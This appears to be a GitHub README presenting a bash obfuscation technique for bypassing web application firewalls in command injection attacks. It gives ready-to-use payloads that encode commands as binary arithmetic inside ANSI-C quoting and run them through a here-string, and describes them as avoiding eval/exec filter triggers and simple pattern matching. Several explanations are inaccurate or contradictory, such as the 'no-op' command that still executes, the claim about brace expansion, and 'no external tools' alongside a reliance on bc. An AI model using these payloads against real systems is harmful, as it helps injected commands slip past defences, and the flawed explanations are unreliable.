## Using bash to bypass WAF in a Command Injection scenario
This Technique is unique since it avoids using `eval` and `exec`. It also utilizes binary encoding which is hard to detect and uses **Here-string** that is an unusual execution path.

<p align="left">
  > <a href="#full-explanation">Explanation</a>
</p>

<p align="center">
  <img border="0" src="example.png" alt="encoding example" title="encoding example">
</p>

### Manual Conversion:

- [Unicode UTF-8 -> Octal (Bytes Radix)](https://onlineunicodetools.com/convert-unicode-to-bytes)
- [Decimal (previous octal output) -> Binary](https://www.rapidtables.com/convert/number/decimal-to-binary.html)

<!--
### Video Example:

[![Link](https://img.youtube.com/vi/B4mpV44Z1-8/0.jpg)](https://www.youtube.com/watch?v=B4mpV44Z1-8)

-->

<br>
<hr>
<br>

### Full Explanation:

## Advanced Bash Command Obfuscation Technique

This technique encodes arbitrary bash commands into an obfuscated one-liner that executes without using eval, exec, or external tools. It leverages bash's parsing rules, ANSI-C quoting, and arithmetic expansion to reconstruct and execute commands at runtime.


## Payload Structure
> Single Word Command (ls)
`${!##-}<<<$\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\'`

> Multi-Word / Commands with spaces (ls -la)
`${!##-}<<<{\$\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\',\$\'\\$(($((1<<1))#00101101))\\$(($((1<<1))#10011010))\\$(($((1<<1))#10011001))\'}`


## Component Breakdown
1. `${!##-}` - Parameter Expansion

| Component |	Meaning |
| ------------- | ------------- |
| `${!}`	| Expands to PID of last background job (a number) |
| `##-`	| Removes leading - if present (e.g., -bash -> bash) |
| Result |	A numeric value that bash treats as a no-op command name |

```bash
# Example expansion
$ echo ${!}
12345
$ echo ${!##-}
12345
```

<br>

2. `<<<` - Here-String Redirection

Feeds the right-hand side as stdin to the command on the left:
```console
command <<< "input text"
```
In this technique, the numeric result of `${!##-}` isn't a real command, but bash still processes the here-string, causing the `$'...'` content to be evaluated.

<br>

3. `$'...'` - ANSI-C Quoting

Enables escape sequence interpretation inside the string:
| Escape | Becomes |
| ------ | ------- |
| `\154` | Octal 154 -> ASCII `l` |
| `\163` | Octal 163 -> ASCII `s` |
| `\n` | Newline |
| `\t` | Tab |

```bash
$ $'\154\163'
ls  # Bash attempts to execute "ls"
```

<br>

4. `\\$(($((1<<1))#BINARY))` - The Encoding Engine

This is the core obfuscation layer. Here's how a single character is encoded:

- Encoding Chain for `l`:
```
Step 1: ASCII 'l'              -> 108 (decimal)
Step 2: Decimal to Octal       -> 154
Step 3: Octal to Binary        -> 10011010
Step 4: Base-2 Arithmetic      -> $((2#10011010)) = 154
Step 5: Inside $'...'          -> \$154 becomes \154 (octal escape)
Step 6: Octal Escape           -> 'l' (executed)
```

- Visual Flow:
```
'l' -> ASCII 108 -> Octal 154 → Binary 10011010
                      V
          $((2#10011010)) = 154
                      V
           \$154 inside $'...'
                      V
                   'l' (executed)
```

<br>

5. Why `\\$((...))` Instead of `$((...))`?

| In Script |	After `printf` | Inside `$'...'` | Final Result |
| --------- | ------------ | ------------- | ------------ |
| `\\$((...))` | `\$((...))` | `\154` (literal backslash + number) | ✅ Octal escape -> char |
| `$((...))` | `$((...))` | `154` (just a number) | ❌ Not an escape |

The **double backslash** is critical. It survives `printf` and becomes a single backslash inside `$'...'`, which bash interprets as an octal escape.

<br>

6. Multi-Word / Commands with spaces - Comma Separation

For commands with spaces, the payload uses brace expansion:

```
${!##-}<<<{\$\'...\',\$\'...\'}
```

| Part | Purpose |
| ---- | ------- |
| `{` | Opens command group |
| `\$\'...\'` |	First word (`ls`) |
| `',\$\'` | Comma separator + new `$'...'` block |
| `...\'` | Second word (`-la`) |
| `}` |	Closes command group |

Bash treats `{cmd1,cmd2}` as a **brace expansion** - both commands execute sequentially.

<br>

## Full Execution Flow

```
┌─────────────────────────────────────────────────────────────┐
│ 1. User runs: ./encode.sh "ls -la"                          │
│ 2. Script splits: ["ls", "-la"]                             │
│ 3. Each char -> ASCII → Octal → Binary                      │
│ 4. Build: ${!##-}<<<{\$\'...\',\$\'...\'}                   │
│ 5. User pastes output into terminal                         │
│ 6. Bash evaluates:                                          │
│    - ${!##-} -> number (ignored)                            │
│    - <<< feeds here-string                                  │
│    - $'...' expands octal escapes                           │
│    - Result: "ls -la" executes                              │
└─────────────────────────────────────────────────────────────┘
```

## Character Reference Table

| Character |	ASCII |	Octal |	Binary | Payload Fragment |
| --------- | ----- | ----- | ------ | ---------------- |
| `l` |	108 |	154 |	10011010 | `\\$(($((1<<1))#10011010))` |
| `s` |	115 |	163 |	10100011 | `\\$(($((1<<1))#10100011))` |
| `-` |	45 | 055 | 00101101 |	`\\$(($((1<<1))#00101101))` |
| `a` |	97 | 141 | 10011001 |	`\\$(($((1<<1))#10011001))` |
| ` ` | 32 | 040 | 00100000 | `\\$(($((1<<1))#00100000))` |


## Reverse Engineering Example:

```bash
# Binary -> Octal -> ASCII
$ echo "$((2#10011010))"  # 154
$ printf '\\%o' 154       # \154
$ printf '\154'           # l
```


## Security Notes

| Aspect | Details |
| ------ | ------- |
| Obfuscation Level |	Medium — bypasses casual inspection and simple pattern matching
| Detection |	Reversible with understanding of the encoding chain
| No `eval`/`exec` | Avoids common security filter triggers
| Pure Bash |	No external dependencies beyond `bc` for encoding
